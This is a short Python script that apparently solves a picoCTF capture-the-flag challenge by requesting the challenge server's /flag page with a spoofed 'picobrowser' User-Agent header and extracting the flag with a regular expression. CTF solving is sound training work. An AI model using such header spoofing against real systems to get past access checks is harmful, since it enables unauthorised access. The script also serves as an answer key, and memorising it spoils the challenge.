import requests
import re

url = "http://fickle-tempest.picoctf.net:50035"

res = requests.get(f'{url}/flag', headers={ 'User-Agent': 'picobrowser' })

print(re.findall(r'(picoCTF{.+})', res.text)[0])